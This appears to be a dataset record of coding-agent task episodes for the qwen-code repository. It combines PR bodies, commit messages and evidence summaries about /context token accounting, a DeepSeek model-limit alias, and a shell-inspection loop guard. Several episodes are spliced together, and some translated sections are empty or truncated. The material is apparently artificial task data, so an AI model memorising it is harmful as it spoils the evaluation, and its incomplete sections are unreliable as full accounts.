issue.title: fix(core): defensive resume cached reset, telemetry mirror clear, and test pins

repository.name: qwen-code
repository.description: An open-source AI coding agent that lives in your terminal.

issue.body:
## What this PR does

Follow-up to #12066. This is a defensive reset plus test pins, not a user-visible staleness fix. When resume seeds the prompt and output counts, it now also clears the process-global telemetry mirror of the cached-content count, and keeps a defensive reset of the per-chat cached slot. Tests pin both clears after a real usage report (finite and non-finite seed inputs), and a `/context` case pins the fallback to the global cached count when no session chat exists yet.

## Why it's needed

The other review items from #12066 are already on `main`; this PR carries the remaining delta. `seedResumeTokenCounts` always runs on a freshly started chat, so the per-chat cached slot is already `0` at that point: the per-chat reset is an invariant guard, and `/context` output is unchanged between BASE and HEAD for that field (confirmed by the maintainer's real-TUI A/B run). The value that does go stale on an in-process `/resume` is the global telemetry mirror: it kept the previous session's cached count next to the newly seeded prompt count (for example prompt 12000 from session B with cached 64653 from session A). Every other writer of the per-chat cached slot already clears that mirror, and this brings the resume seed in line. The only reader of the mirror today is the no-chat fallback in `/context`, which had no test for a nonzero global value either.

## Reviewer Test Plan

### How to verify

1. `cd packages/core && npx vitest run src/core/llm-chat.test.ts`: 530/530 pass. The resume case records a usage report with `cachedContentTokenCount: 64_653`, calls `seedResumeTokenCounts` with non-finite and then finite inputs, and after each call expects the per-chat cached slot to be `0` and `uiTelemetryService.setLastCachedContentTokenCount` to have last been called with `0`. With the new telemetry line removed, this case fails (`expected last "spy" call to have been called with [ +0 ]`).
2. `cd packages/cli && npx vitest run src/ui/commands/contextCommand.test.ts`: 49/49 pass. The no-chat case expects the displayed cached figure to be the global `1_000` when the chat is not initialized (this pins existing behavior).
3. `cd packages/core && npm run typecheck` and `npx eslint src/core/llm-chat.ts src/core/llm-chat.test.ts`: both clean.

### Evidence (Before & After)

N/A for the TUI: `/context` output is the same on BASE and HEAD. The observable difference is the global telemetry mirror after an in-process resume: before, it holds the previous session's cached count; after, it reads `0` until the next API usage report.

### Tested on

|     OS     | Status |
| :--------: | :----: |
|  🍏 macOS  | ⚠️ |
| 🪟 Windows | ⚠️ |
|  🐧 Linux  | ✅ |

### Environment (optional)

N/A (unit tests only).

## Risk & Scope

- Main risk or tradeoff: after resume, the global cached mirror reads `0` until the next API usage report instead of a value from a different session. The per-chat slot behaves as before.
- Not validated / out of scope: restoring the cached figure on resume (the transcript records `cachedContentTokenCount`, but `ResumeTokenCounts` does not carry it); the daemon deferred-session path.
- Breaking changes / migration notes: none.

## Linked Issues

Follow-up to #12066. Relates to #12047.

<details>
<summary>中文说明</summary>

## 这个 PR 做了什么

#12066 的后续。本 PR 是防御性清零加测试固定行为，不是用户可见的残留值修复。resume 恢复 prompt 与 output 计数时，同时清空进程级 telemetry 镜像中的缓存计数，并保留对 per-chat 缓存槽的防御性清零。测试在真实 usage 上报之后（分别用有限值和非有限值调用 seed）固定这两处清零；另有一条 `/context` 用例固定「尚无会话 chat 时回退到全局缓存计数」的行为。

## 为什么需要

#12066 的其它评审项已经在 `main` 上，本 PR 只包含剩余增量。`seedResumeTokenCounts` 总是在新建的 chat 上执行，此时 per-chat 缓存槽本来就是 `0`，所以这一清零只是不变式保护，BASE 与 HEAD 的 `/context` 输出在这一项上完全相同（维护者的真实 TUI A/B 测试已确认）。同一进程内 `/resume` 时真正残留旧值的是全局 telemetry 镜像：它把上一个会话的缓存数和新恢复的 prompt 数放在一起（例如会话 B 的 prompt 12000 配上会话 A 的 cached 64653）。其它写 per-chat 缓存槽的地方都会同时清空镜像，本 PR 让 resume 的 seed 保持一致。镜像目前唯一的读取方是 `/context` 的无 chat 回退路径，此前也没有针对全局值非零的测试。

## 审阅者测试计划

### 如何验证

1. `cd packages/core && npx vitest run src/core/llm-chat.test.ts`：530/530 通过。resume 用例先上报 `cachedContentTokenCount: 64_653`，再依次用非有限值和有限值调用 `seedResumeTokenCounts`，每次调用后都期望 per-chat 缓存槽为 `0`，且 `uiTelemetryService.setLastCachedContentTokenCount` 最后一次以 `0` 调用。删掉新增的 telemetry 那一行后，该用例失败（`expected last "spy" call to have been called with [ +0 ]`）。
2. `cd packages/cli && npx vitest run src/ui/commands/contextCommand.test.ts`：49/49 通过。无 chat 用例期望 chat 未初始化时显示全局值 `1_000`（固定已有行为）。
3. `cd packages/core && npm run typecheck` 以及 `npx eslint src/core/llm-chat.ts src/core/llm-chat.test.ts`：均无报错。

### 证据（修改前 / 修改后）

TUI 方面 N/A：BASE 与 HEAD 的 `/context` 输出相同。可观察的差异在同一进程内 resume 之后的全局 telemetry 镜像：修改前保留上一个会话的缓存数，修改后在下一次 API usage 上报前为 `0`。

### 测试平台

macOS ⚠️ 未测；Windows ⚠️ 未测；Linux ✅。

### 环境

N/A（仅单元测试）。

## 风险与范围

- 主要风险：resume 之后，全局缓存镜像在下一次 API usage 上报前为 `0`，而不是另一个会话的值。per-chat 缓存槽行为不变。
- 未验证 / 范围外：resume 时恢复缓存数（transcript 记录了 `cachedContentTokenCount`，但 `ResumeTokenCounts` 不携带它）；daemon 延迟会话路径。
- 破坏性变更：无。

## 关联 Issue

#12066 的后续，关联 #12047。

</details>

pull_request.title: fix(cli): prefer per-session cached token count in /context
pull_request.body:
## What this PR does

Makes `/context` (and the shared `collectContextData` path) prefer a per-session cached-content token count from the active chat, instead of always subtracting the process-global cached count when deriving the messages category.

On the write side, `cachedContentTokenCount` is mirrored onto the chat whenever usage metadata is recorded (including zero) and kept in the per-route retain/restore path. On the read side, `collectContextData` uses `activeChat.getLastCachedContentTokenCount()` when a chat exists, and falls back to the global singleton only when no chat exists yet — the same shape already used for the prompt total (#5763).

## Why it's needed

In a multi-session `serve` / daemon process, `/context` already reads the prompt total from the active chat, but it still subtracted the process-global cached-content count. A large cache hit from another session could silently drive `messages` toward zero via `Math.max(0, total - foreignCached)` (#12047). That mis-attribution also affects other multi-session surfaces that call `collectContextData` (non-interactive control and ACP), not only interactive `/context`.

## Reviewer Test Plan

### How to verify

1. `vitest run packages/cli/src/ui/commands/contextCommand.test.ts` — expect 21/21, including: (1) foreign global cache of 64_653 cannot collapse messages on a 65_267-token session with chat cached=1_000; (2) chat cached=0 with foreign global 64_653 uses `total − scaledOverhead` (pins `??` vs `||`).
2. Optional core gates that touch the mirrored field / retain path (as available in the package suites).
3. Manual or merge-reference: two `qwen serve` sessions in one daemon; complete a turn with cache hits in A; open `/context` (or `GET /session/:id/context-usage?detail=true`) in B and confirm B's messages are not driven by A's cache. @yiliang114 verified this end-to-end on macOS with the real bundled daemon and a local fake provider: merge base showed A messages collapse to 614 after B's 64_653 cache; PR head kept A at 64_267.

### Evidence (Before & After)

Unit: foreign global cache no longer collapses messages when the active chat has its own cached count. Also pins chat cached=`0` / foreign global `64_653` so `messages` comes from `total − scaledOverhead` (`??`), not the foreign cache (a future `||` would reintroduce the leak).

Manual two-session Web Shell check (A long prompt ×2 → B `/context detail`): **pending** — will paste B's before/after `/context detail` here when available. Not inventing numbers.

@yiliang114's merge-reference run (exact-revision bundle, two `sessionScope: "thread"` sessions):

| Observation | Merge base | PR head |
|---|---:|---:|
| A before B, `total / messages` | `65,267 / 64,267` | `65,267 / 64,267` |
| A after B, `total / messages` | `65,267 / 614` | `65,267 / 64,267` |

Before/after captures: https://github.com/QwenLM/qwen-code/pull/12066#issuecomment-5712643793

### Tested on

|     OS     | Status |
| :--------: | :----: |
|  🍏 macOS  | ✅ (@yiliang114 merge-reference / daemon HTTP) |
| 🪟 Windows | N/A |
|  🐧 Linux  | ✅ (unit tests) |

### Environment (optional)

Unit tests locally. Merge-reference verification used a repository-local fake OpenAI server (no external model credentials) against a real `qwen serve` daemon.

## Risk & Scope

- Main risk or tradeoff: touches core chat write + retain/restore paths; readers that still expect the global singleton alone will see per-session values when a chat is active. Fallback to the singleton remains when no chat exists.
- Not validated / out of scope: external provider cache semantics; taxonomy/breakdown issues tracked separately in #12033.
- Breaking changes / migration notes: none. Single-session interactive CLI continues to read its own value.

## Linked Issues

Fixes #12047

<details>
<summary>中文说明</summary>

## 这个 PR 做了什么

让 `/context`（以及共享的 `collectContextData` 路径）优先使用活跃会话 chat 上的 per-session cached-content token 计数，而不是在推导 messages 分类时始终减去进程级全局缓存计数。

写入侧：每当记录 usage metadata（含零值）时，把 `cachedContentTokenCount` 镜像到 chat，并纳入 per-route retain/restore。读取侧：存在 chat 时用 `activeChat.getLastCachedContentTokenCount()`，尚无 chat 时才回退全局单例——与 prompt total 已有的写法同形（#5763）。

## 为什么需要

## 审阅者测试计划

### 如何验证

1. `vitest run packages/cli/src/ui/commands/contextCommand.test.ts` —— 预期 21/21，含：(1) chat cached=1_000 时外来全局 64_653 不能压垮 messages；(2) chat cached=0 / 外来全局 64_653 走 `total − scaledOverhead`（钉住 `??` 而非 `||`）。

### 证据（修改前 / 修改后）

单元：外来全局缓存在活跃 chat 自有缓存计数时不再压垮 messages。另钉住 chat cached=`0` / 外来全局 `64_653`，`messages` 走 `total − scaledOverhead`（`??`），不会吃外来缓存（若改成 `||` 会把泄漏带回来）。

前后截图见：https://github.com/QwenLM/qwen-code/pull/12066#issuecomment-5712643793

### 测试平台

| :--------: | :----: |

### 环境（可选）

本地单元测试。merge-reference 使用仓库内 fake OpenAI server（无外部模型凭证）对真实 `qwen serve` 守护进程验证。

## 风险与范围

- 主要风险或取舍：触及 core chat 的写入与 retain/restore；仍只期望全局单例的读取方在存在 chat 时会看到 per-session 值。无 chat 时仍回退单例。

pull_request.title: fix(cli): make /context categories add up to the provider total
pull_request.body:
## What this PR does

Reworks the `/context` breakdown so its rows partition the request by content and add up to the provider-reported total, following the ruling posted on #12033. The skills row now includes the `<available_skills>` listing exactly as it was sent in the startup prelude, and each per-skill detail row measures that skill's rendered entry after budget trimming and XML escaping, instead of a hand-written template. The rest of the startup prelude (environment context, MCP server instructions, deferred-tools reminder) becomes its own "Startup context" row. Messages is now estimated from the conversation after the prelude, skipping skill tool responses because their bodies are already billed under skills. When the estimates exceed the provider total, every row is scaled down together; when they fall short, the gap is shown as an explicit "Unattributed" row. The provider's cached count is shown as a "Cached prefix" annotation under Used and is never subtracted from any row.

The three new fields (`startupContext`, `unattributed`, `cachedTokens`) are optional on the CLI, serve and SDK types. The text output, the ink view, the opentui projection and the Web Shell panel render the new rows only when they are non-zero, so older daemons and existing fixtures render exactly as before.

## Why it's needed

`/context detail` is the tool people use to decide what to trim from the non-conversation prefix, and its numbers did not add up: in the sample on #12028 the categories summed to 47,348 against a reported total of 65,267, messages read 614 on a one-turn session, and the per-skill rows summed to 19,187 against a skills category of 4,620. #12033 traced this to four display-path defects: the skills category left out the listing its own detail rows measured, those rows used a template that had drifted from the text actually sent, messages was derived by subtracting the cached count, and the startup prelude belonged to no category. With #12047 fixed by #12066, the cached count is per-session, so the remaining work is the taxonomy itself, which the issue asked to land as one change.

## Reviewer Test Plan

### How to verify

1. Unit tests: `packages/cli/src/ui/commands/contextCommand.test.ts` adds a `category identity (#12033)` block covering: the listing billed under skills and the rest of the prelude as startup context; per-skill rows matching the rendered entry; rows plus unattributed summing exactly to the total; proportional scaling with zero unattributed when estimates exceed the total; messages independent of the cached count (the old derivation would print 10,000 where the new one prints 300); skill tool responses excluded from messages; and the text output rows. The two #12047 tests now assert the per-session `cachedTokens` annotation instead of a messages value. `ContextUsage.test.tsx` checks the ink view renders the three new rows.
2. Manually, in a session with a few skills installed: send one message, run `/context detail`. Expected: System prompt + Built-in tools + MCP tools + Memory files + Skills + Startup context + Messages + Unattributed equals Used; the Skills detail rows reflect the listing as sent; Cached prefix appears under Used when the provider reports a cache hit; Messages grows with the conversation rather than collapsing toward zero on cache hits.
3. In Web Shell against a daemon, the context usage panel shows the same new rows.

### Evidence (Before & After)

Not captured. Nothing was built, run or tested locally for this PR; the unit tests above run in CI. A before/after `/context detail` from a real session is still wanted before this leaves draft.

### Tested on

## Risk & Scope

- Main risk or tradeoff: Messages changes meaning from "total minus overhead or cache" to a content estimate, so users will see different numbers for the same session. Estimates use the same CJK-aware heuristic as the other rows; its bias against the Qwen tokenizer is unmeasured, and the Unattributed row is what makes that bias visible rather than hidden. Media parts (images, files) have no text estimate and therefore land in Unattributed.
- Not validated / out of scope: nothing was run locally. Before a chat exists there is no prelude to read, so Startup context is 0 and the skill listing is measured from `buildAvailableSkillsReminder` instead. Telemetry-path estimator issues stay in #12048; per-extension grouping of memory files (#12030 item 4) is a follow-up.

## 这个 PR 做了什么

按照 #12033 下发布的裁定重做 `/context` 的分类：各行按内容划分请求，并与 provider 报告的总数对上。Skills 行现在包含启动 prelude 中实际发送的 `<available_skills>` 清单，每个 skill 的明细行度量的是它经过预算裁剪和 XML 转义后实际渲染出的条目，而不是手写模板。启动 prelude 的其余部分（环境上下文、MCP 服务器说明、延迟工具提醒）单独成为"启动上下文"一行。Messages 改为按 prelude 之后的对话内容估算，并跳过 skill 工具的返回结果，因为它们携带的正文已计入 skills。估算之和超过 provider 总数时，所有行一起按比例缩小；不足时，差额显式显示为"未归因"一行。provider 的缓存数作为"缓存前缀"注记显示在"已用"之下，不从任何一行中扣减。

三个新字段（`startupContext`、`unattributed`、`cachedTokens`）在 CLI、serve 和 SDK 类型上都是可选的。纯文本输出、ink 界面、opentui 投影和 Web Shell 面板只在新行非零时才渲染，因此旧版 daemon 和现有测试数据的渲染结果与之前完全一致。

## 为什么需要

`/context detail` 是大家用来决定非对话前缀该裁剪什么的工具，而它的数字对不上：#12028 的样本里分类之和为 47,348，报告总数为 65,267；一个只有一轮的会话 messages 显示 614；各 skill 明细行之和为 19,187，而 skills 分类只有 4,620。#12033 把原因归结为展示路径上的四处缺陷：skills 分类不包含它自己明细行所度量的清单；明细行使用的模板已与实际发送的文本漂移；messages 由缓存数相减得出；启动 prelude 不属于任何分类。#12047 已由 #12066 修复，缓存数现在按会话读取，剩下的就是分类本身，issue 要求作为一次改动落地。

## 评审测试计划

### 如何验证

1. 单元测试：`packages/cli/src/ui/commands/contextCommand.test.ts` 新增 `category identity (#12033)` 测试块，覆盖：清单计入 skills、prelude 其余部分计为启动上下文；每个 skill 明细行与渲染条目一致；各行加未归因恰好等于总数；估算超出总数时按比例缩放且未归因为 0；messages 与缓存数无关（旧算法此处会得到 10,000，新算法得到 300）；skill 工具返回结果不计入 messages；以及纯文本输出中的新行。两个 #12047 测试改为断言按会话读取的 `cachedTokens` 注记，而非 messages 数值。`ContextUsage.test.tsx` 检查 ink 界面渲染三个新行。
2. 手动验证：在装有几个 skill 的会话中发送一条消息，执行 `/context detail`。预期：系统提示词 + 内置工具 + MCP 工具 + 记忆文件 + Skills + 启动上下文 + 消息 + 未归因 等于"已用"；Skills 明细行反映实际发送的清单；provider 报告缓存命中时"已用"下方出现缓存前缀；消息随对话增长，而不会在缓存命中时趋近于 0。
3. 在连接 daemon 的 Web Shell 中，上下文用量面板显示同样的新行。

### 证据（前后对比）

- 主要风险或取舍：Messages 的含义从"总数减开销或缓存"变为按内容估算，同一会话用户看到的数字会变化。估算使用与其他行相同的 CJK 感知启发式，它相对 Qwen tokenizer 的偏差尚未实测，而"未归因"一行正是让这个偏差可见而非被掩盖的手段。媒体部分（图片、文件）没有文本估算，因此计入"未归因"。

commit.message:
fix(cli): make /context categories add up to the provider total

The breakdown now partitions the request by content, per the ruling on
#12033:

- skills includes the <available_skills> listing as actually sent,
  parsed from the startup prelude, and per-skill rows measure the
  post-trim entries instead of a hand-rolled template
- the rest of the startup prelude is its own startupContext row
- messages is estimated from the conversation after the prelude, with
  skill tool responses excluded (their bodies are billed under skills),
  instead of being derived as total minus the cached count
- when estimates exceed the provider total every row is scaled down;
  when they fall short the gap is reported as unattributed
- the cached count is carried as a cachedTokens annotation and never
  subtracted from any row

The new fields are optional on the CLI, serve and SDK types, and each
renderer (text, ink, opentui projection, web-shell) shows the new rows
only when non-zero.

Nothing was run locally; CI runs the unit tests.

Fixes #12033
Merge remote-tracking branch 'origin/main' into fix/issue-12033-context-breakdown
Merge remote-tracking branch 'origin/main' into fix/issue-12033-context-breakdown

Merge origin/main into fix/issue-12033-context-breakdown

Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>

Patrol-Run: qwen-pr-closeout/jmu6zqhwj3o

fix(cli): bill nested tool media flat and keep the context scale unit-consistent

R1-1: estimateConversationTokens serialized the whole functionResponse,
including the nested `parts[k].inlineData.data` carrier core's tools use for
screenshots. Raw base64 billed at chars/4 pushed the estimate past the provider
total, collapsing `scale` and deflating every category row while `unattributed`
stayed 0. Serialize only the text-bearing envelope and charge nested media at
the flat per-image budget, mirroring core's estimatePartChars; the budget comes
from resolveSlimmingConfig so it tracks the configured imageTokenEstimate.

R1-2: `scale` divided a totalTokens that can itself be a char/4 estimate
(compressFast, resume seeding) by a numerator measured with the CJK-aware
estimator, deflating every row by up to ~6x on CJK-heavy text. Scale only
against a provider-reported total and cap `messages` at the residual, so the
rows still close against the total.

R1-4: read the history through getHistoryShallow(), falling back to
getHistory() for chat objects that lack it. The deep structuredClone copied
every base64 payload for a caller that only reads.

R1-5: the estimated branch derived freeSpace and the compaction tier from
rawOverhead alone and discarded the conversationTokens computed beside it, so a
100K-token history on a 200K window reported 80% free and tier "safe" right
before the cheap gate compacted. Use rawContent for both, and drop the stale
"Config doesn't expose the active chat instance" claim from the SCOPE GAP note.

Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>
Patrol-Run: qwen-pr-closeout/jmu6zqhwj3o

Merge origin/main into fix/issue-12033-context-breakdown

Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>

Patrol-Run: qwen-pr-closeout/jmu6zqhwj3o

fix(cli): attribute skill tokens to the category that actually bills them

Three attribution gaps in the /context breakdown, all in the skill path:

- The `skill` functionResponse skip was keyed on the tool name, but the
  billing it deferred to (`loadedBodiesTokens`) only fires for tracked
  file-skill bodies. A `skill` response carrying a same-named command's
  expanded prompt — which the Skill tool returns without calling
  `onSkillLoaded` — or a body whose tracking was cleared by `/restore`,
  compression or a resume that declined to match, left `messages` and was
  owned by no category, landing in `unattributed`. Key the skip on the body
  instead: `estimateConversationTokens` now receives the exact set of
  `buildSkillLlmContent` strings that `loadedBodiesTokens` bills, and accepts
  the same two shapes core's `restoreLoadedSkillsFromHistory` does (verbatim,
  or with a suffix after a newline).
- Detail rows came from `listSkills()` while the `skills` category is measured
  from the rendered listing, so the two sets disagreed in both directions.
  Model-invocable commands are merged into that listing but never returned by
  `listSkills()`, so they were billed with no row; a skill enabled mid-session
  is announced by a tail `<available_skills>` reminder that
  `getStartupContextLength` never inspects, so its row printed `0 tokens`
  while its text was billed to `messages`. Rows now cover every listing entry,
  and tail listing reminders are measured into the same map and excluded from
  the conversation estimate. Rows still never feed `skillsTokens`.
- The `scale < 1` test's two assertions were unconditional in the impl, so
  dropping `* scale` from a row, or folding the cached count back into the
  `messages` subtraction, stayed green. It now passes a nonzero cached count
  and pins three rows against their own unscaled values.

Verified by mutation: all nine mutations (name-keyed skip, dropping
loadedBodiesTokens, dropping either row-reconciliation half, dropping
`* scale` from skills/startupContext, disabling scaleDetail for skills,
folding cached into the subtraction, removing loaded/bodyTokens) go red on
exactly the intended test.

Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>
Patrol-Run: qwen-pr-closeout/jmu765z7c3z

test(cli): pin the /context zero-skip guards and the tool-billing arms

Review R1-14, R1-15, R1-12 and R1-8. The three optional rows (Cached
prefix, Startup context, Unattributed) had presence assertions in the ink
view, the text renderer and the opentui projection, but nothing witnessed
their `> 0` skip guards, and `estimateConversationTokens`' `functionCall`
arm plus its non-skill `functionResponse` arm were executed by no test.

Measured before this change, against the unmodified test files, one mutant
at a time: 11 of 12 survived their focused suite. Dropping any one guard in
ContextUsage.tsx left 6/6 green; dropping any one in
formatContextUsageText left 34/34 green; deleting the projection's
`startupContext` table entry, reverting its widened zero-skip, or deleting
its cached/unattributed block left 39/39 green; deleting the
`functionCall` arm left 34/34 green. After this change all 13 mutants
(including a narrower one that unbills only non-skill tool output) are
killed, each by a named test, with the mutated source reverted and
`git diff --exit-code` clean.

Tests only; no production behaviour changes.

Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>
Patrol-Run: qwen-pr-closeout/jmu7clgkt4b

fix(cli): keep /context rows inside the total for media, clamps and skill paths

Charge a top-level media part at the flat image budget so `freeSpace` and the
tier see it, and keep nested media on the same budget.

Scale the overhead against itself rather than against the conversation content,
which measures a strictly larger set with a CJK-aware estimator, and keep the
clamp armed for estimate-derived totals so the rows cannot overshoot.

Absorb the clamp deficit in the tool rows that caused it instead of in
`messages`: `displayBuiltinTools` floors at 0, so the excess used to be charged
to the overhead and taken straight back out of the conversation figure.

Derive a skill's base directory with `path.dirname` like every core producer
does, so a Windows file path is not billed as a body core never sent.
fix(cli): keep scaled context rows within the total

test(cli): pin the /context accounting acceptance cases from review

Add the five acceptance tests the round-2 review findings demanded
(top-level media charge, backslash skill dirname, rawOverhead-only
scaling, codeModeOnly clamp deficit, sumRows identity), rebased onto
the a0d13bba fix shape; one skill fixture now declares its tool so the
clamp deficit does not spill into the skills row, matching production.

Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>

episode.title: fix(cli): prefer per-session cached token count in /context
episode.before: At parent fa2be323938e25f0d5889b0b1525547b82c40b93, the context-usage reader already took the prompt total from the active chat when one existed, but always took cached-content tokens from the process-global UiTelemetryService singleton. The cached value controlled the messages row through max(0, totalTokens - apiCachedTokens) whenever it was positive, so a cache count produced by another session in the same daemon could silently collapse the current session's messages toward zero. LlmChat had per-chat prompt/output state and a route-retention map, but no per-chat cached-content field: route retention recovered cached content by rereading the global singleton, the response path only wrote nonzero cached values to that singleton, and prompt seeding, fast compression, and failed hard-rescue rollback did not preserve or clear a chat-owned cached value.
episode.after: The resolved implementation makes cached-content usage session-owned and state-continuous. LlmChat now owns a lastCachedContentTokenCount field and exposes a route-aware getter. Retained route records carry the chat-local cached count, route adoption restores the matching value, route invalidation and prompt/history replacement clear the local and telemetry mirrors, and failed hard-rescue rollback restores the cached count together with prompt/output counts. When a response has a usable prompt or total count, its coerced cached-content count is written onto the chat and mirrored to telemetry even when the count is zero, preventing a stale nonzero value from surviving. collectContextData now uses the active chat's non-nullish cached-count getter, preserving zero, and falls back to the global singleton only when the chat value is unavailable. The shared path therefore reports the active session's cached prefix for interactive context output, non-interactive context control, and ACP session context usage.
episode.diff: Pinned commit 3ac6fe65e81c84897c02d22abd3dc91d1e567d5f is the merged implementation for PR #12066, which fixes issue #12047. The parent-to-pinned diff changes exactly four files: packages/cli/src/ui/commands/contextCommand.ts, its regression test, packages/core/src/core/llm-chat.ts, and its route/token-state test. The CLI production change replaces the unconditional global cached-token read with activeChat?.getLastCachedContentTokenCount?.() ?? uiTelemetryService.getLastCachedContentTokenCount(). The core production change adds chat-local cached-token ownership, carries that value through route retention/adoption, clears it in invalidation and compression paths, snapshots and restores it during hard-rescue rollback, and unconditionally mirrors the cached value for stampable usage reports, including zero. The tests add two daemon cross-talk/zero-nullish context cases and expand core coverage for route retention, reset behavior, and failed rescue restoration. The diff is 214 additions and 56 deletions across the four files.

evidence_units.claim: Issue #12047 reports that the active chat supplies the total prompt-token count while the cached-content count comes from a process-global singleton; the cached count feeds the messages calculation, so another daemon session can be charged during context breakdown.

The pinned commit is implementation-bearing, has parent fa2be323938e25f0d5889b0b1525547b82c40b93, is titled fix(cli): prefer per-session cached token count in /context (#12066), and explicitly contains Fixes #12047.

The parent-to-pinned diff changes exactly four files: the CLI context command and test plus the core LlmChat implementation and test; the per-file counts are 67/0, 6/4, 95/33, and 46/19 additions/deletions respectively.

Before the fix, collectContextData read apiCachedTokens only from uiTelemetryService, and a positive cached value drove messagesTokens = Math.max(0, totalTokens - apiCachedTokens); zero used the scaled-overhead branch.

After the fix, collectContextData reads activeChat?.getLastCachedContentTokenCount?.() with nullish fallback to uiTelemetryService.getLastCachedContentTokenCount(), so an active chat value of zero does not fall through to the foreign global value.

The core change adds a per-chat lastCachedContentTokenCount field and a route-aware getter, assigns the field when adopting a retained route, and stores the chat-local value in each retained route record instead of rereading the process-global telemetry singleton.
evidence_units.source: git diff 3ac6fe65e81c84897c02d22abd3dc91d1e567d5f^ 3ac6fe65e81c84897c02d22abd3dc91d1e567d5f -- packages/core/src/core/llm-chat.ts, hunks around lines 2186-2192, 2435-2444, 2471-2495, and 2517-2523

evidence_units.claim: The core change keeps the cached count coherent across state transitions: route invalidation zeroes it, setLastPromptTokenCount clears it and the telemetry mirror, fast compression clears it and all retained route counts, hard-rescue snapshots and restores it, and a stampable usage report writes the coerced cached count onto the chat and telemetry even when it is zero.
evidence_units.source: git diff 3ac6fe65e81c84897c02d22abd3dc91d1e567d5f^ 3ac6fe65e81c84897c02d22abd3dc91d1e567d5f -- packages/core/src/core/llm-chat.ts, hunks around lines 2458-2467, 2593-2599, 2888-2895, 3142-3146, 3242-3267, and 6030-6075

evidence_units.claim: The repaired collectContextData path is shared by the interactive context command, the non-interactive get-context-usage controller, and the ACP session context-usage status path, so the session-scoped read applies beyond the interactive slash command.

The CLI regression tests construct an active chat with cached=1,000 while the global singleton reports foreign cached=64,653 and assert messages remains above 10,000; a second test uses active-chat cached=0 with the same foreign global value and asserts the overhead branch is used, messages remains above 10,000, and the leaked 614 result is absent.

The core tests assert that cached content is stored on the chat, retained as 42 across a route switch away and back, cleared when the next usage report omits cached content, cleared when non-API prompt replacement or fast compression occurs, not mirrored for a response without a usable prompt/total count, and restored as 42,000 when a failed hard rescue rolls back route-scoped state.

The merged PR body reports a two-session daemon merge-reference using a local fake provider: with total/messages 65,267/64,267 before the other session's cache, the merge base fell to 65,267/614 after a foreign 64,653 cache, while the PR head remained 65,267/64,267. episode.title: Prevent context-budget collapse for DeepSeek's canonical flash alias

evidence_units.claim: Issue #11894 reports that the official DeepSeek endpoint accepts `deepseek-flash` and `deepseek-v4-pro`, rejects the DashScope spelling `deepseek-v4.1-flash`, and that direct `deepseek-flash` resolution produces 131072 input and 32000 output; measured long `/review --effort high` sessions repeatedly compacted and one died with `COMPRESSION_FAILED_OUTPUT_TRUNCATED`, while a 1,000,000 context workaround completed normally.

The parent implementation table is first-match ordered: `/^deepseek-v4/` maps input to the 1,000,000 bucket before `/^deepseek/` maps other DeepSeek names to 131072; the output table has `/^deepseek-v4/` at 384000 but no generic DeepSeek output row, leaving unmatched names to the 32000 default.

The pinned implementation widens both existing V4 rows to `/^deepseek-(?:v4|flash)/`, keeps the input row before the generic `/^deepseek/` fallback and the output row before the older-family rows, and documents the official-versus-DashScope spelling distinction.

Commit `3987391392611e5d1f66851681f13ee7e55f4864` has parent `156092e892db5b098bd6d0ecf606dd37449538fe`, changes two files, and reports 12 additions and 2 deletions: the core limit table and its test.

The head test adds a dedicated case asserting `tokenLimit('deepseek-flash')` equals 1000000 and `tokenLimit('deepseek-flash', 'output')` equals 384000, alongside the existing V4 and older-family cases.

The input call site in `modelConfigResolver.ts` uses `knownTokenLimit(modelId, 'input')` to auto-fill `contextWindowSize` when no explicit provider value exists, which is the custom-provider path implicated by the issue.

The OpenAI-compatible default provider and Anthropic generator call `tokenLimit(model, 'output')` together with `hasExplicitOutputLimit`, so widening the output row changes the alias from unknown-model handling to the existing known-V4 output-budget path.

The PR test plan reports a direct probe of 1000000 input and 384000 output for `deepseek-flash`, unchanged neighboring values, and `vitest run src/core/tokenLimits.test.ts` passing 91/91; it also states that reverting the regex makes the new case fail at 131072/32000.

A PR verification comment reports a two-tree CLI `/context` A/B: `deepseek-flash` is 1000.0k on the head and 131.1k with the merge-base table, while `deepseek-xyz` remains 131.1k as a control; the context/compaction ladder moves with the corrected window and the relevant product CI lanes are green.

A maintainer's real-build verification isolates the two regex rows, reports 91/91 unit tests at head and exactly one reverted-test failure, measures `deepseek-flash` changing from 131072/32000/unknown/32000 to 1000000/384000/known/64000, shows a 250k prompt is safe after the change rather than entering compaction, and reproduces then removes the reported compression failure using an injected prompt count.

    fix(core): halt repeated shell inspection variants (#5944)
    
    * fix(core): halt repeated shell inspection variants
    
    * test(core): cover shell-stagnation streak reset, fix guard-count doc
    
    Address review on #5944: the checkAlwaysOnSafeties JSDoc still said it
    enforces two guards after the shell inspection-command stagnation guard
    was added, so correct it to three.
    
    Add a regression test proving a non-inspection tool call resets the
    shell-stagnation streak to zero, which is the guard's main false-positive
    defense and was previously untested.
    
    * fix(core): exclude write-bearing git chains from stagnation bucket
    
    isGitInspectionCommand matched if any segment of a shell chain was a git
    status/diff/ls-files, so a productive chain like
    `git add . && git status && git commit` was classified as read-only
    inspection. Eight such commands would falsely trip the always-on
    shell-stagnation guard.
    
    Require every segment of the chain to be a read-only git inspection
    before bucketing. Mixed chains that also write fail open (non-inspection),
    the safe direction for an always-on halt. The #4695 loop is still caught:
    its compound case is status && diff, both read-only.
    
    * fix(core): halt repeated shell inspection variants
    
    * fix(core): treat path-specific git diffs as progress
    
    * test(core): cover shell stagnation guard boundaries
    
    * test(core): address shell stagnation review feedback
    
    * docs(core): sync loop guard comments

episode.title: Structured tool-contract integrity: stop varied read-only shell inspection loops

evidence_units.claim: Issue #4695 reports a long-context session in which the model repeatedly emits shell tool calls, asks for client-side repeated-call detection and a per-turn cap, and records substantial repeated-call cost before the user stops the run.

PR #5944 explicitly links Fixes #4695 and explains that varying read-only git overview commands can evade exact repeated-call detection; it defines the narrow always-on scope and the fail-open exclusions for file-specific diffs, write-bearing chains, mixed commands, and progress boundaries.
The pinned implementation ref 3ce46949c2132dd8b3cc8f05cdc6c023aee0c2da has parent 680f523853175856236162460fcd6985c9d68620 and changes four files with 461 additions and 16 deletions.

The parent loop-detection service has a five-call exact same-tool-and-JSON-arguments guard and a 100-call per-turn hard cap in its always-on tier, but no shell-inspection bucket, shell streak state, or shell-specific always-on guard; action stagnation remains in the heuristic path.

